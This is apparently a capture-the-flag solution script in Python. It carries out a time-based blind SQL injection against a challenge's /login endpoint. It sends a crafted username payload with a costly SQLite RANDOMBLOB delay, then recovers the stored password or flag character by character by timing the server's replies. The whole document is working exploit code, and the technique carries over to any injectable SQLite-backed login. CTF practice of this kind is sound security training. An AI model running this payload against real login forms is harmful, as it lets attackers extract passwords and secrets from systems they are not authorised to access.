HOST = "challs.nusgreyhats.org"
HOST = "localhost"
# Update port as needed
PORT = 32909

# Put the solution script here
import requests, time
charset = "01357etoanihsrdluc24689gwyfmbkvjxqzp{}_"
sleep = "100=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(400000000/2))))"
flag = ""
for i in range(30):
    for c in charset:
        t = time.time()
        requests.post(f"http://{HOST}:{PORT}/login", 
                      data={"username":f"' or (pass like '{flag + c}%' and {sleep});-- ", "password": ""}).json()
        t2 = time.time() - t
        if t2 > 1:
            flag += c
            print(flag)
            break